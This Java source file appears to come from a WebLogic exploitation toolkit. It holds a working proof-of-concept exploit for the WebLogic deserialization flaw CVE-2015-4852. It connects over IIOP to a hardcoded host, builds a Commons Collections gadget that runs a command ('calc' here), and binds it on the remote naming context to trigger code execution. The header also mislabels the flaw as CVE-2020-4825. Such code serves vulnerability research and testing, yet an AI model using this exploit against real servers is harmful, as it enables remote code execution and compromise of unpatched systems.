/*
 * Copyright  2020.  r4v3zn
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *  http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.weblogic.framework.payloads.impl;

import com.weblogic.framework.gadget.ObjectPayload;
import com.weblogic.framework.gadget.impl.CommonsCollections1Gadget;
import javax.naming.Context;
import java.net.URL;
import static com.weblogic.framework.utils.ContextUtils.getContext;

/**
 * Title: CVE_2015_4852
 * Desc:
 * <p>
 *     CVE-2020-4825
 *     此漏洞主要是由于apache的标准库中Apache Commons Collections基础库的TransformedMap类。
 *     paper: https://github.com/panicall/panicall.github.io/blob/e2b8b88624/_posts/2020-01-27-Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9ACVE_2015_4852.md
 * </p>
 *
 * Date: 2020/4/8 23:00
 * @version 1.0.0
 */
public class CVE_2015_4852 {
    public static void main(String[] args) throws Exception {
        String url = "http://192.168.1.13:7001/console";
        URL weblogicUrl = new URL(url);
        String host = weblogicUrl.getHost();
        int port = weblogicUrl.getPort();
        String conUrl = "iiop://"+host+":"+port;
        System.out.println(conUrl);
        Context context = getContext(conUrl);
        ObjectPayload objectPayload = new CommonsCollections1Gadget();
        Object object = objectPayload.getObject("calc",null);
        context.rebind("hello",object);
    }
}
